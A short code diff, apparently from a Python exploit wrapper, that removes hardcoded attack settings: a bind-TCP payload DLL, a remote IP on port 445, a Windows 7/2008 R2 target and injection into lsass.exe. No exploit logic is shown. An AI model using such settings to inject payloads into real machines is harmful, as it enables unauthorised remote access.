@@ -19,14 +19,6 @@ quote = "'"
 space = " "
 direct = " > "
 
-dll = "bind_tcp.dll"
-rhost = "194.165.129.83"
-rport = "445"
-timeout = "60"
-arch = "x64"
-target = "WIN72K8R2"
-process = "lsass.exe"
-
 dll = rhost = rport = timeout = arch = version = process = ""
 
 def getArguments():
@@ -138,16 +130,3 @@ def main():
 
 
 main()
-
-
-
-
-
-
-
-
-
-
-
-
-
